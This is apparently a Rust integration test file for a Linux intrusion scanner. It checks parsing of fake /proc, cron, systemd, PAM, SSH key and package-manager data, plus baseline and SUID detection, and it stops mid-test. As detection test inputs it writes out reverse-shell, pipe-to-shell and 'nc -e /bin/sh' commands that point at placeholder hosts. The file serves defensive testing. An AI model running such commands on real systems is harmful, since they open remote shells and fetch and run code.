//! Integration tests with made-up /proc, /etc and systemd files in a
//! temporary directory (tempfile). Nothing on the real system is read or changed.

use scanner::baseline::{self, Baseline};
use scanner::config::{glob_match, Config};
use scanner::external_tools::{parse_chkrootkit, parse_debsums, parse_lynis, parse_rkhunter};
use scanner::modules::common::analyze_command;
use scanner::modules::net_proc::{encode_hex_addr, parse_hex_addr, parse_proc_net, parse_sched_debug, parse_ss_listeners, Proto};
use scanner::modules::persistence::{parse_authorized_key, parse_cron_line, parse_pam_line, parse_unit};
use scanner::modules::{fs_perms, proc_audit, Collector, ScanCtx};
use scanner::procinfo::{parse_stat, read_proc, snapshot};
use scanner::sandbox;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::net::SocketAddr;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn opts(modules: &[ModuleId]) -> ScanOptions {
    ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() }
}

// ------------------------------------------------------------ /proc/net/tcp

#[test]
fn hex_addresses_round_trip_ipv4_and_ipv6() {
    for s in ["127.0.0.1:53", "10.0.0.5:4444", "0.0.0.0:0", "[::1]:631", "[2001:db8::42]:443", "[::ffff:192.0.2.1]:22"] {
        let a: SocketAddr = s.parse().expect("address");
        let v6 = matches!(a, SocketAddr::V6(_));
        assert_eq!(parse_hex_addr(&encode_hex_addr(&a), v6).expect("parse"), a, "{s}");
    }
}

#[test]
fn parses_kernel_style_proc_net_tcp() {
    // This is what loopback DNS looks like in a real /proc/net/tcp on x86_64 (little endian)
    let text = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n\
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   991        0 21345 1 0000000000000000 100 0 0 10 5\n\
   1: 0500000A:A8CA 42710FCB:115C 01 00000000:00000000 02:000A7D9A 00000000  1000        0 99887 2 0000000000000000 20 4 30 10 -1\n\
   2: broken line\n";
    let (entries, bad) = parse_proc_net(text, Proto::Tcp);
    assert_eq!(bad, 1, "the broken line should be counted, not crash");
    assert_eq!(entries.len(), 2);
    assert_eq!(entries[0].local.to_string(), "127.0.0.53:53");
    assert!(entries[0].is_listening());
    assert_eq!(entries[0].uid, 991);
    assert_eq!(entries[1].local.to_string(), "10.0.0.5:43210");
    assert_eq!(entries[1].remote.to_string(), "203.15.113.66:4444");
    assert_eq!(entries[1].remote.port(), 4444);
    assert!(entries[1].is_established());
    assert_eq!(entries[1].inode, 99887);
}

#[test]
fn parses_ipv6_listener() {
    let text = "header\n   0: 00000000000000000000000000000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1234 1 0 100 0 0 10 0\n";
    let (e, bad) = parse_proc_net(text, Proto::Tcp6);
    assert_eq!(bad, 0);
    assert_eq!(e[0].local.to_string(), "[::]:22");
}

#[test]
fn parses_sched_debug_and_ss() {
    let sched = "cpu#0\nrunnable tasks:\n S task PID tree-key switches prio\n------\n S   systemd     1   1234.567  5000  120  0.0  1.0\n>R   my prog   4101   22.5   3  120  0.0  1.0\n";
    let pids = parse_sched_debug(sched);
    assert!(pids.contains(&1) && pids.contains(&4101), "{pids:?}");
    let ss = "tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*\nudp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*\n";
    let set = parse_ss_listeners(ss);
    assert!(set.contains(&("tcp".into(), 22)) && set.contains(&("udp".into(), 53)));
}

// ------------------------------------------------------------ processes

#[test]
fn stat_with_spaces_and_parens_in_name() {
    let (comm, state, ppid, flags) = parse_stat("4242 (evil (x) name) S 1 4242 4242 0 -1 2097152 0 0").expect("stat");
    assert_eq!(comm, "evil (x) name");
    assert_eq!(state, 'S');
    assert_eq!(ppid, 1);
    assert_eq!(flags, 0x0020_0000);
}

#[test]
fn detects_deleted_binary_and_tmp_exe() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/77/stat", "77 (x) S 1 77 77 0 -1 0 0 0\n");
    write(root, "/proc/77/status", "Name:\tx\nTgid:\t77\nPPid:\t1\nUid:\t0\t0\t0\t0\n");
    write(root, "/proc/77/cmdline", "/tmp/x\0");
    symlink("/tmp/x (deleted)", root.join("proc/77/exe")).expect("symlink");
    fs::create_dir_all(root.join("proc/77/fd")).expect("fd");
    symlink("socket:[555]", root.join("proc/77/fd/3")).expect("fd link");

    let sys = SysRoot::new(root);
    let p = read_proc(&sys, 77).expect("process");
    assert!(p.exe_deleted());
    assert_eq!(p.exe_path(), Some("/tmp/x"));
    assert_eq!(p.socket_fds, vec![(3, 555)]);

    let cfg = Config::default();
    let procs = snapshot(&sys);
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &procs };
    let mut col = Collector::default();
    proc_audit::run(&ctx, &mut col);
    let rules: Vec<&str> = col.findings.iter().map(|f| f.rule.as_str()).collect();
    assert!(rules.contains(&"PROC-DELETED"), "{rules:?}");
    assert!(rules.contains(&"PROC-TMP-EXE"), "{rules:?}");
    let deleted = col.findings.iter().find(|f| f.rule == "PROC-DELETED").expect("finding");
    // running from a temporary folder and deleted from disk is the clearest sign there is
    assert_eq!(deleted.severity, Severity::Critical);
}

#[test]
fn missing_proc_files_never_panic() {
    let dir = tempfile::tempdir().expect("tempdir");
    // A completely empty root: no /proc files at all
    let sys = SysRoot::new(dir.path());
    let report = run_scan(&sys, &Config::default(), &ScanOptions::default(), &|_| {});
    assert!(report.notes.iter().any(|n| n.contains("/proc/net/tcp")), "{:?}", report.notes);
    assert_eq!(report.summary.critical, 0);
}

// ------------------------------------------------------------ SUID and baseline

#[test]
fn suid_diff_flags_new_file_as_critical() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/bin/passwd", "x");
    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");

    let sys = SysRoot::new(root);
    let cfg = Config::default();
    let first = run_scan(&sys, &cfg, &opts(&[ModuleId::FsPerms]), &|_| {});
    assert_eq!(first.inventory.suid.len(), 1);
    assert!(first.findings.iter().all(|f| f.severity < Severity::Critical));
    let base_path = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&base_path).expect("save");

    // new SUID file and changed content in the old one
    write(root, "/usr/local/bin/backdoor", "y");
    fs::set_permissions(root.join("usr/local/bin/backdoor"), fs::Permissions::from_mode(0o4755)).expect("chmod");
    write(root, "/usr/bin/passwd", "changed");
    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");

    let o = ScanOptions { baseline_compare: Some(base_path), ..opts(&[ModuleId::FsPerms]) };
    let second = run_scan(&sys, &cfg, &o, &|_| {});
    let new = second.findings.iter().find(|f| f.rule == "BASE-SUID-NEW").expect("new SUID file");
    assert_eq!(new.severity, Severity::Critical);
    assert!(new.title.contains("/usr/local/bin/backdoor"));
    assert!(second.has_rule("BASE-SUID-CHANGED"));
    assert_eq!(second.findings[0].severity, Severity::Critical, "the report should be sorted with Critical first");
}

#[test]
fn baseline_compare_skips_modules_not_scanned() {
    let b = Baseline {
        format_version: 1,
        created_at: "then".into(),
        hostname: "h".into(),
        kernel: "k".into(),
        os: "o".into(),
        scanner_version: "0".into(),
        modules: vec!["persistence".into()],
        suid: vec![],
        listeners: vec![],
        persistence_files: Default::default(),
        accounts: vec![],
        boot: Default::default(),
        desktop: None,
        ssh_keys: None,
        bluetooth: None,
        peripherals: None,
    };
    let (f, notes) = baseline::compare(&b, &Default::default(), &["fs_perms".to_string()]);
    assert!(f.is_empty());
    assert!(notes.iter().any(|n| n.contains("SUID")));
}

#[test]
fn fs_walk_skips_virtual_paths() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/1/fake", "x");
    fs::set_permissions(root.join("proc/1/fake"), fs::Permissions::from_mode(0o4755)).expect("chmod");
    let sys = SysRoot::new(root);
    let cfg = Config::default();
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
    let mut col = Collector::default();
    fs_perms::run(&ctx, &mut col);
    assert!(col.inventory.suid.is_empty(), "/proc should be skipped");
}

// ------------------------------------------------------------ systemd, cron, ssh, pam

#[test]
fn systemd_unit_with_tmp_exec_is_flagged() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/systemd/system/dummy.service", "[Service]\nExecStart=-/dev/shm/.x \\\n  --daemon\n");
    symlink("../dummy.service", {
        fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).expect("mkdir");
        root.join("etc/systemd/system/multi-user.target.wants/dummy.service")
    })
    .expect("symlink");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Persistence]), &|_| {});
    let f = report.findings.iter().find(|f| f.rule == "PERS-SYSTEMD-EXEC").expect("finding");
    assert_eq!(f.severity, Severity::Critical);
    assert!(f.evidence.contains("enabled"));
    assert!(report.inventory.units.iter().any(|u| u.name == "dummy.service" && u.enabled));
}

#[test]
fn unit_parser_handles_continuations() {
    let e = parse_unit("[Service]\n# kommentar\nExecStart=/bin/echo a \\\n  b\nUser=nobody\n");
    assert_eq!(e[0], ("Service".into(), "ExecStart".into(), "/bin/echo a    b".into()));
    assert_eq!(e[1].1, "User");
}

#[test]
fn cron_lines() {
    assert_eq!(parse_cron_line("MAILTO=root", true), None);
    let (s, u, c) = parse_cron_line("*/5 * * * * root curl x | sh", true).expect("line");
    assert_eq!((s.as_str(), u.as_deref(), c.as_str()), ("*/5 * * * *", Some("root"), "curl x | sh"));
    let (s, u, c) = parse_cron_line("@reboot /home/a/.x", false).expect("line");
    assert_eq!((s.as_str(), u, c.as_str()), ("@reboot", None, "/home/a/.x"));
}

#[test]
fn command_analysis() {
    let cfg = Config::default();
    let sev = |c: &str| analyze_command(c, &cfg).iter().map(|i| i.severity).max();
    assert_eq!(sev("/usr/sbin/sshd -D"), None);
    assert_eq!(sev("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"), Some(Severity::Critical));
    assert_eq!(sev("echo aGk= | base64 -d | sh"), Some(Severity::Critical));
    assert_eq!(sev("wget -qO- http://x/y | bash"), Some(Severity::Critical));
    assert_eq!(sev("/tmp/update.sh"), Some(Severity::High));
    assert_eq!(sev("python3 -c 'import socket,pty;s=socket.socket()'"), Some(Severity::Critical));
}

#[test]
fn authorized_keys_options_and_comment() {
    let k = parse_authorized_key("command=\"nc -e /bin/sh 1.2.3.4 1\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl").expect("key");
    assert_eq!(k.option("command"), Some("nc -e /bin/sh 1.2.3.4 1"));
    assert!(k.has_option("no-pty"));
    assert_eq!(k.comment, "");
    assert!(k.fingerprint().expect("fingerprint").starts_with("SHA256:"));
    let k2 = parse_authorized_key("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl anna@laptop").expect("key");
    assert_eq!(k2.comment, "anna@laptop");
    assert!(parse_authorized_key("# kommentar").is_none());
}

#[test]
fn pam_lines() {
    let (t, c, m, a) = parse_pam_line("auth\t[success=1 default=ignore]\tpam_unix.so nullok").expect("line");
    assert_eq!((t.as_str(), c.as_str(), m.as_str()), ("auth", "[success=1 default=ignore]", "pam_unix.so"));
    assert_eq!(a, vec!["nullok".to_string()]);
    assert!(parse_pam_line("@include common-auth").is_none());
}

#[test]
fn whitelist_glob_and_toml_round_trip() {
    assert!(glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/app/chrome-sandbox"));
    assert!(!glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/a/b/chrome-sandbox"));
    let cfg = Config::default();
    let text = cfg.to_toml().expect("toml");
    let back: Config = toml::from_str(&text).expect("parse");
    assert_eq!(back, cfg);
    let partial: Config = toml::from_str("allowed_listen_ports = [\"tcp/8080\"]").expect("partial");
    assert!(partial.is_listen_allowed("tcp", 8080));
    assert!(!partial.allowed_suid.is_empty(), "missing fields should get default values");
}

// ------------------------------------------------------------ external tools

#[test]
fn debsums_and_friends_parse() {
    let f = parse_debsums("/usr/bin/ls\n/usr/share/doc/x/README\n", "debsums: missing file /usr/share/man/man1/a.1.gz (from a package)\n");
    assert_eq!(f.len(), 3);
    assert!(f.iter().any(|x| x.rule == "EXT-DEBSUMS-CHANGED" && x.severity == Severity::Critical));
    assert!(f.iter().any(|x| x.rule == "EXT-DEBSUMS-CHANGED" && x.severity == Severity::Low));
    assert!(f.iter().any(|x| x.rule == "EXT-DEBSUMS-MISSING"));
    // a second opinion: serious, but never on its own proof of a break-in
    assert_eq!(parse_chkrootkit("Checking `ls'... INFECTED\n")[0].severity, Severity::High);
    assert_eq!(parse_rkhunter("Warning: The file properties have changed:\n         File: /usr/bin/ls\n").len(), 1);
    assert_eq!(parse_lynis("", "warning[]=SSH-7408|Root login|\nsuggestion[]=X|y|\n").len(), 2);
}

#[test]
fn known_debian_false_alarms_are_low() {
    // Lines from a real root scan on Debian 13
    let rk = parse_rkhunter("Warning: Hidden file found: /etc/.updated: ASCII text\nWarning: The command '/usr/bin/lwp-request' has been replaced by a script: /usr/bin/lwp-request: Perl script text executable\n");
    assert_eq!(rk.len(), 2);
    assert!(rk.iter().all(|f| f.severity == Severity::Low && f.rule == "EXT-RKHUNTER-KNOWN"), "{rk:?}");
    let ck = parse_chkrootkit("WARNING: Output from ifpromisc:\nwlp2s0: PACKET SNIFFER(/usr/sbin/NetworkManager[1044], /usr/sbin/wpa_supplicant[1049])\nWARNING: output from chkwtmp:\n1 deletion(s) between Fri Nov  6 08:53:56 2026 and Fri Nov  6 08:55:52 2026\n");
    assert_eq!(ck.len(), 1);
    assert!(!ck[0].evidence.contains("SNIFFER"), "{}", ck[0].evidence);
    assert!(ck[0].evidence.contains("chkwtmp"));
}

#[test]
fn nfs_callback_listener_is_low_and_shared_socket_reported_once() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    write(
        root,
        "/proc/net/tcp",
        &format!(
            "{hdr}   0: 00000000:A873 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 23931 1 0 100 0 0 10 0\n   1: 00000000:006F 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 16439 1 0 100 0 0 10 0\n"
        ),
    );
    write(root, "/proc/mounts", "fileserver:/export/data /mnt/data nfs4 rw,vers=4.0 0 0\n");
    // the kernel thread [NFSv4 callback]
    write(root, "/proc/3243/stat", "3243 (NFSv4 callback) S 2 0 0 0 -1 2129984 0 0\n");
    write(root, "/proc/3243/status", "Name:\tNFSv4 callback\nTgid:\t3243\nPPid:\t2\nUid:\t0\t0\t0\t0\n");
    // systemd (PID 1) and rpcbind share port 111 through socket activation
    for (pid, comm, exe, uid) in [(1u32, "systemd", "/usr/lib/systemd/systemd", 0u32), (885, "rpcbind", "/usr/sbin/rpcbind", 113)] {
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({comm}) S 1 0 0 0 -1 4194560 0 0\n"));
        write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{comm}\nTgid:\t{pid}\nPPid:\t1\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n"));
        write(root, &format!("/proc/{pid}/cmdline"), &format!("{exe}\0"));
        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("exe");
        fs::create_dir_all(root.join(format!("proc/{pid}/fd"))).expect("fd");
        symlink("socket:[16439]", root.join(format!("proc/{pid}/fd/5"))).expect("sock");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    let orphan = report.findings.iter().find(|f| f.rule == "NET-ORPHAN-LISTEN").expect("orphan");
    assert_eq!(orphan.severity, Severity::Low, "{}", orphan.description);
    let p111: Vec<_> = report.findings.iter().filter(|f| f.rule == "NET-LISTEN-UNKNOWN").collect();
    assert_eq!(p111.len(), 1, "{p111:?}");
    assert!(p111[0].title.contains("rpcbind"), "{}", p111[0].title);
}

#[test]
fn whitelist_port_ranges_trusted_processes_and_hidden_findings() {
    let cfg = Config::default();
    assert!(cfg.is_listen_allowed("udp", 1716), "KDE Connect range");
    assert!(cfg.is_listen_allowed("tcp", 1764));
    assert!(!cfg.is_listen_allowed("tcp", 1765));
    assert!(!cfg.is_listen_allowed("udp", 22));
    assert!(cfg.is_listen_process_allowed("avahi-daemon", Some("/usr/sbin/avahi-daemon")));
    assert!(!cfg.is_listen_process_allowed("avahi-daemon", Some("/tmp/avahi-daemon")), "a copy outside /usr is not trusted");
    assert!(!cfg.is_listen_process_allowed("rpcbind", Some("/usr/sbin/rpcbind")), "rpcbind exposure is still reported");
    assert!(cfg.is_listen_process_allowed("firefox-esr", Some("/usr/lib/firefox-esr/firefox-esr")), "browser UDP ports are normal");

    let f = scanner::Finding::new(Severity::Low, "persistence", "PERS-SYSTEMD-LOCAL", "Locally created systemd unit: x.service");
    let mut hidden = Config::default();
    assert!(!hidden.suppresses(&f));
    hidden.ignore_findings.push(Config::finding_key(&f));
    assert!(hidden.suppresses(&f));
    let back: Config = toml::from_str(&hidden.to_toml().expect("toml")).expect("parse");
    assert!(back.suppresses(&f), "hidden findings survive saving and loading");
}

#[test]
fn verdict_follows_the_worst_finding() {
    use scanner::report::{Report, VerdictLevel};
    let mut r = Report { running_as_root: true, scan_root: "/".into(), ..Report::default() };
    r.finalize();
    assert_eq!(r.verdict().level, VerdictLevel::Clean);
    r.findings.push(scanner::Finding::new(Severity::Medium, "m", "X", "t"));
    r.finalize();
    assert_eq!(r.verdict().level, VerdictLevel::Minor);
    r.findings.push(scanner::Finding::new(Severity::Critical, "m", "Y", "t"));
    r.finalize();
    let v = r.verdict();
    assert_eq!(v.level, VerdictLevel::Alarm);
    assert!(r.to_text(false).contains("VERDICT:"));
    let html = r.to_html();
    assert!(html.starts_with("<!doctype html>") && !html.contains("<script"));
    let line = r.summary_line();
    assert!(line.starts_with("ALARM ") && !line.contains('\n') && line.contains("1 critical"), "{line}");
}

#[test]
fn commands_that_need_root_get_sudo() {
    use scanner::finding::sudoize;
    assert_eq!(sudoize("lynis show details PKGS-7392"), "sudo lynis show details PKGS-7392");
    assert_eq!(sudoize("ls -l /proc/12/exe /proc/12/cwd"), "sudo ls -l /proc/12/exe /proc/12/cwd");
    assert_eq!(sudoize("ss -tulpn | grep ':111 '"), "sudo ss -tulpn | grep ':111 '");
    assert_eq!(sudoize("cat /sys/module/x; rpcinfo -p"), "cat /sys/module/x; rpcinfo -p");
    assert_eq!(sudoize("cat /sys/module/x; chkrootkit chkwtmp"), "cat /sys/module/x; sudo chkrootkit chkwtmp");
    assert_eq!(sudoize("echo x | sudo tee /etc/f"), "echo x | sudo tee /etc/f", "already sudo");
    assert_eq!(sudoize("dpkg -S /usr/bin/ls"), "dpkg -S /usr/bin/ls");
}

#[test]
fn lynis_warnings_explain_and_use_sudo() {
    let f = parse_lynis("", "warning[]=PKGS-7392|Found one or more vulnerable packages.|\n");
    assert_eq!(f[0].verify[0], "sudo lynis show details PKGS-7392");
    assert!(f[0].description.contains("updates"), "{}", f[0].description);
}

#[test]
fn rkhunter_dev_shm_and_permitrootlogin_are_known() {
    let out = "Warning: Suspicious file types found in /dev:\n         /dev/shm/lsp-catalog-malte.shm: data\n         /dev/shm/lsp-catalog-malte.lock: data\nWarning: The SSH configuration option 'PermitRootLogin' has not been set.\n         The default value may be 'yes', to allow root access.\nWarning: Something really odd in /dev/shm/x\n";
    let f = parse_rkhunter(out);
    assert_eq!(f.len(), 3);
    assert_eq!(f[0].rule, "EXT-RKHUNTER-KNOWN");
    assert!(f[0].verify.last().expect("fix").contains("ALLOWDEVFILE=/dev/shm/lsp-catalog-malte.shm"), "{:?}", f[0].verify);
    assert_eq!(f[1].rule, "EXT-RKHUNTER-KNOWN");
    assert_eq!(f[2].rule, "EXT-RKHUNTER-WARN");
}

#[test]
fn chkrootkit_wtmp_gap_is_low() {
    let f = parse_chkrootkit("WARNING: output from chkwtmp:\n1 deletion(s) between Fri Nov  6 08:53:56 2026 and Fri Nov  6 08:55:52 2026\n");
    assert_eq!(f.len(), 1);
    assert_eq!(f[0].rule, "EXT-CHKROOTKIT-WTMP");
    assert_eq!(f[0].severity, Severity::Low);
}

#[test]
fn parses_apt_simulation_and_marks_security_updates() {
    use scanner::modules::updates::parse_apt_simulation;
    let out = "Reading package lists...\nInst libssl3t64 [3.5.1-1] (3.5.1-1+deb13u1 Debian-Security:13/stable-security [amd64])\nInst htop [3.4.0-1] (3.4.1-1 Debian:13.1/stable [amd64])\nInst newdep (1.0 Debian:13.1/stable [amd64])\nConf libssl3t64 (3.5.1-1+deb13u1 Debian-Security:13/stable-security [amd64])\n";
    let p = parse_apt_simulation(out);
    assert_eq!(p.len(), 3);
    assert!(p[0].security && !p[1].security);
    assert_eq!(p[0].old.as_deref(), Some("3.5.1-1"));
    assert_eq!(p[0].new, "3.5.1-1+deb13u1");
    assert_eq!(p[2].old, None);
}

#[test]
fn automatic_baseline_is_saved_once_and_not_on_a_dirty_scan() {
    use scanner::autobaseline::{auto_save_to, AutoBaseline};
    use scanner::report::Report;
    let dir = tempfile::tempdir().expect("tempdir");
    let target = dir.path().join("state/baseline.json");
    let mut r = Report {
        running_as_root: true,
        scan_root: "/".into(),
        modules: ModuleId::CORE.iter().map(|m| m.id().to_string()).collect(),
        ..Report::default()
    };
    r.finalize();

    // not root → nothing saved, with a reason
    let mut user = r.clone();
    user.running_as_root = false;
    assert!(matches!(auto_save_to(&user, &target), AutoBaseline::Skipped(_)));
    // incomplete scan
    let mut partial = r.clone();
    partial.modules.pop();
    assert!(matches!(auto_save_to(&partial, &target), AutoBaseline::Skipped(_)));
    // serious findings → no baseline of a possibly compromised system
    let mut dirty = r.clone();
    dirty.findings.push(scanner::Finding::new(Severity::Critical, "m", "X", "t"));
    dirty.finalize();
    assert!(matches!(auto_save_to(&dirty, &target), AutoBaseline::Skipped(_)));
    assert!(!target.exists());
    // clean, complete, root → saved; a second time nothing is needed
    assert_eq!(auto_save_to(&r, &target), AutoBaseline::Saved(target.clone()));
    assert!(Baseline::load(&target).is_ok());
    assert_eq!(auto_save_to(&r, &target), AutoBaseline::NotNeeded);
}

fn md5_of(data: &str) -> String {
    use md5::{Digest, Md5};
    Md5::digest(data.as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

fn suid(root: &Path, path: &str, content: &str) {
    write(root, path, content);
    fs::set_permissions(root.join(path.trim_start_matches('/')), fs::Permissions::from_mode(0o4755)).expect("chmod");
}

#[test]
fn apt_upgrades_are_verified_and_only_other_changes_are_flagged() {
    use scanner::autobaseline::refresh_upgraded;
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("root");
    suid(&root, "/usr/bin/passwd", "passwd v1");
    suid(&root, "/usr/bin/su", "su v1");
    suid(&root, "/usr/bin/mount", "mount v1");
    write(&root, "/etc/pam.d/common-auth", "auth required pam_unix.so\n");
    let sys = SysRoot::new(&root);
    let o = opts(&[ModuleId::FsPerms, ModuleId::Persistence]);
    let mut first = run_scan(&sys, &Config::default(), &o, &|_| {});
    first.generated_at = "2026-01-01 00:00:00 +0000".into();
    let base = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&base).expect("save");

    // passwd: a real upgrade (new content, new package checksum, log entry)
    suid(&root, "/usr/bin/passwd", "passwd v2");
    // su: changed by someone, the package ships something else
    suid(&root, "/usr/bin/su", "su with a backdoor");
    // a new SUID file nobody owns
    suid(&root, "/usr/bin/zz-unknown", "x");
    // a SUID bit set by hand on a packaged program that apt did not touch
    suid(&root, "/usr/bin/ping6x", "ping");
    // a config file changed by a package upgrade (conffile checksum in status)
    write(&root, "/etc/pam.d/common-auth", "auth required pam_unix.so nullok\n");
    write(&root, "/var/lib/dpkg/info/passwd.md5sums", &format!("{}  usr/bin/passwd\n", md5_of("passwd v2")));
    write(&root, "/var/lib/dpkg/info/util-linux.md5sums", &format!("{}  bin/su\n", md5_of("su v1")));
    write(&root, "/var/lib/dpkg/info/iputils-ping.md5sums", &format!("{}  usr/bin/ping6x\n", md5_of("ping")));
    write(&root, "/var/lib/dpkg/status", &format!("Package: libpam-runtime\nStatus: install ok installed\nConffiles:\n /etc/pam.d/common-auth {}\nDescription: x\n", md5_of("auth required pam_unix.so nullok\n")));
    write(&root, "/var/log/dpkg.log", "2026-06-01 10:00:00 upgrade passwd:amd64 1:4.17-1 1:4.17-2\n2026-06-01 10:00:01 upgrade util-linux:amd64 2.41-1 2.41-2\n2026-06-01 10:00:02 upgrade libpam-runtime:all 1.7-1 1.7-2\n");

    let o = ScanOptions { baseline_compare: Some(base.clone()), ..o };
    let report = run_scan(&sys, &Config::default(), &o, &|_| {});
    let find = |rule: &str, path: &str| report.findings.iter().find(|f| f.rule == rule && f.evidence.contains(path));

    assert!(find("BASE-SUID-CHANGED", "/usr/bin/passwd").is_none(), "verified upgrade is not flagged");
    assert!(report.upgraded_files.iter().any(|p| p == "/usr/bin/passwd"), "{:?}", report.upgraded_files);
    assert!(find("BASE-PERSIST-CHANGED", "/etc/pam.d/common-auth").is_none(), "upgraded conffile is not flagged");
    assert!(report.notes.iter().any(|n| n.contains("verified against their package")), "{:?}", report.notes);

    let su = find("BASE-SUID-CHANGED", "/usr/bin/su").expect("tampered su");
    assert_eq!(su.severity, Severity::Critical);
    assert!(su.description.contains("does NOT match"), "{}", su.description);
    let unknown = find("BASE-SUID-NEW", "/usr/bin/zz-unknown").expect("unowned");
    assert_eq!(unknown.severity, Severity::Critical);
    assert!(unknown.description.contains("no installed package"), "{}", unknown.description);
    let hand = find("BASE-SUID-NEW", "/usr/bin/ping6x").expect("chmod by hand");
    assert_eq!(hand.severity, Severity::Critical);
    assert!(hand.description.contains("by hand"), "{}", hand.description);

    // the verified files are put into the baseline, so they are not looked at again
    assert!(refresh_upgraded(&report, &base).expect("refresh") >= 2);
    let again = run_scan(&sys, &Config::default(), &o, &|_| {});
    assert!(again.upgraded_files.is_empty(), "{:?}", again.upgraded_files);
    assert!(again.findings.iter().any(|f| f.rule == "BASE-SUID-CHANGED" && f.evidence.contains("/usr/bin/su")), "tampering stays");
}

#[test]
fn many_ports_of_one_program_become_one_finding() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    let line = |i: u32, port: u16, inode: u32| format!("   {i}: 00000000:{port:04X} 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 {inode} 1 0 100 0 0 10 0\n");
    write(root, "/proc/net/tcp", &format!("{hdr}{}{}{}", line(0, 53489, 701), line(1, 53711, 702), line(2, 40000, 703)));
    write(root, "/proc/1965/stat", "1965 (rpc.statd) S 1 0 0 0 -1 4194560 0 0\n");
    write(root, "/proc/1965/status", "Name:\trpc.statd\nTgid:\t1965\nPPid:\t1\nUid:\t113\t113\t113\t113\n");
    write(root, "/proc/1965/cmdline", "/usr/sbin/rpc.statd\0");
    symlink("/usr/sbin/rpc.statd", root.join("proc/1965/exe")).expect("exe");
    fs::create_dir_all(root.join("proc/1965/fd")).expect("fd");
    for (n, inode) in [(5, 701), (6, 702), (7, 703)] {
        symlink(format!("socket:[{inode}]"), root.join(format!("proc/1965/fd/{n}"))).expect("sock");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    let f: Vec<_> = report.findings.iter().filter(|f| f.rule == "NET-LISTEN-UNKNOWN").collect();
    assert_eq!(f.len(), 1, "{f:?}");
    assert!(f[0].title.contains("tcp/40000") && f[0].title.contains("tcp/53711") && f[0].title.contains("(rpc.statd)"), "{}", f[0].title);
    assert!(f[0].description.contains("NFS"), "{}", f[0].description);
    assert_eq!(f[0].evidence.matches("socket:").count(), 3);
}

#[test]
fn random_ports_of_a_known_program_are_not_new_listeners() {
    use scanner::baseline::ListenerKey;
    use scanner::modules::net_proc::Connection;
    let key = |proto: &str, port: u16, process: &str| ListenerKey { proto: proto.into(), port, process: process.into() };
    let conn = |proto: &str, port: u16, process: &str| Connection {
        proto: proto.into(),
        local_addr: "0.0.0.0".into(),
        local_port: port,
        remote_addr: "0.0.0.0".into(),
        remote_port: 0,
        state: "UNCONN".into(),
        listening: true,
        uid: 1000,
        inode: 1,
        pid: Some(1),
        process: Some(process.into()),
        cmdline: None,
        exe: None,
    };
    let base = Baseline {
        format_version: 1,
        created_at: "then".into(),
        hostname: "h".into(),
        kernel: "k".into(),
        os: "o".into(),
        scanner_version: "0".into(),
        modules: vec!["net_proc".into()],
        suid: vec![],
        listeners: vec![key("udp", 1716, "kdeconnectd"), key("udp", 40000, "kdeconnectd")],
        persistence_files: Default::default(),
        accounts: vec![],
        boot: Default::default(),
        desktop: None,
        ssh_keys: None,
        bluetooth: None,
        peripherals: None,
    };
    let mut inv = scanner::modules::Inventory::default();
    for p in [35622, 37707, 45314] {
        inv.connections.push(conn("udp", p, "kdeconnectd"));
    }
    let (f, _) = baseline::compare(&base, &inv, &["net_proc".to_string()]);
    assert!(f.is_empty(), "random ports of a known program: {f:?}");
    // a fixed low port, or a program that was not there, is still news – one finding per program
